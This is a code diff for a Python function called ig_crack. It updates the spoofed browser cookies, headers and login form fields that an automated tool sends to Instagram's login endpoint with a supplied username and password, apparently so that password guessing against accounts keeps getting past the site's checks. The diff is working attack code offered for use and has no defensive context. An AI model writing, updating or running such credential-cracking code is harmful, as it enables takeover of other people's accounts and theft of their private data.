@@ -227,47 +227,50 @@ def ig_crack(uid, pww, total_idz):
             response = session.get('https://www.instagram.com/accounts/login/')
             csrftoken = response.cookies.get('csrftoken')
             cookies ={
-                'csrftoken': csrftoken,
-                'mid': 'Z3_NxgABAAHd4ED09Lhwla239MVc',
-                'ig_did': str(uuid.uuid4()).upper(),
-                'ig_nrcb': '1',
-                'datr': 'xs1_Z1Sdt0lJ1jAvwkEBIHNb',
-                'ps_l': '1',
-                'ps_n': '1',
-                'wd': '885x773',}
+            'csrftoken': csrftoken,
+            'datr': 'y_MRaaJ8HwV_R9JTOXC2cdKM',
+            'ig_did': str(uuid.uuid4()).upper(),
+            'mid': 'aRHzzAALAAH30QLf11SvZ5PdgADa',
+            'ig_nrcb': '1',
+            'wd': '1183x773',}
             data = {
-                "enc_password": enc_password,
-                'optIntoOneTap': 'false',
-                'queryParams': '{"hl":"en"}',
-                'trustedATOM-INSiceRecords': '{}',
-                'username': uid,}
+            'enc_password': enc_password,
+            'caaF2DebugGroup': '0',
+            'isPrivacyPortalReq': 'false',
+            'loginAttemptSubmissionCount': '0',
+            'optIntoOneTap': 'false',
+            'queryParams': '{"hl":"en"}',
+            'trustedDeviceRecords': '{}',
+            'username': uid,
+            'jazoest': '21821',}
             headers = {
-                'authority': 'www.instagram.com',
-                'accept': '*/*',
-                'accept-language': 'en-IN,en-US;q=0.9,en-GB;q=0.8,en;q=0.7,hi;q=0.6,gu;q=0.5',
-                'content-type': 'application/x-www-form-urlencoded',
-                'origin': 'https://www.instagram.com',
-                'priority': 'u=1, i',
-                'referer': 'https://www.instagram.com/accounts/login/?hl=en',
-                'sec-ch-prefers-color-scheme': 'dark',
-                'sec-ch-ua': '"Not)A;Brand";v="99", "Google Chrome";v="127", "Chromium";v="127"',
-                'sec-ch-ua-full-version-list': '"Not)A;Brand";v="99.0.0.0", "Google Chrome";v="127.0.6533.120", "Chromium";v="127.0.6533.120"',
-                'sec-ch-ua-mobile': '?0',
-                'sec-ch-ua-model': '""',
-                'sec-ch-ua-platform': '"Windows"',
-                'sec-ch-ua-platform-version': '"10.0.0"',
-                'sec-fetch-dest': 'empty',
-                'sec-fetch-mode': 'cors',
-                'sec-fetch-site': 'same-origin',
-                'user-agent': ua,
-                'x-asbd-id': '129477',
-                'x-csrftoken': csrftoken,
-                'x-ig-app-id': '936619743392459',
-                'x-ig-www-claim': '0',
-                'x-instagram-ajax': '1015820104',
-                'x-requested-with': 'XMLHttpRequest',}
+            'accept': '*/*',
+            'accept-language': 'en-US,en;q=0.9',
+            'content-type': 'application/x-www-form-urlencoded',
+            'origin': 'https://www.instagram.com',
+            'priority': 'u=1, i',
+            'referer': 'https://www.instagram.com/accounts/login/?hl=en',
+            'sec-ch-prefers-color-scheme': 'dark',
+            'sec-ch-ua': '"Chromium";v="142", "Google Chrome";v="142", "Not_A Brand";v="99"',
+            'sec-ch-ua-full-version-list': '"Chromium";v="142.0.7444.60", "Google Chrome";v="142.0.7444.60", "Not_A Brand";v="99.0.0.0"',
+            'sec-ch-ua-mobile': '?0',
+            'sec-ch-ua-model': '""',
+            'sec-ch-ua-platform': '"Windows"',
+            'sec-ch-ua-platform-version': '"10.0.0"',
+            'sec-fetch-dest': 'empty',
+            'sec-fetch-mode': 'cors',
+            'sec-fetch-site': 'same-origin',
+            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Safari/537.36',
+            'x-asbd-id': '359341',
+            'x-csrftoken': csrftoken,
+            'x-ig-app-id': '936619743392459',
+            'x-ig-www-claim': '0',
+            'x-instagram-ajax': '1029643186',
+            'x-requested-with': 'XMLHttpRequest',
+            'x-web-device-id': '048502C5-4001-4BB4-8654-5B1CB4BB691E',
+            'x-web-session-id': 'r64lx4:120e92:xjxzru',}
             login_url = 'https://www.instagram.com/api/v1/web/accounts/login/ajax/'
-            response = requests.post(login_url,headers=headers, data=data)
+            response = requests.post(login_url, cookies=cookies, headers=headers, data=data)
             session_cookies = response.cookies.get_dict()
             if response.status_code == 200:
                 json_response = response.json()
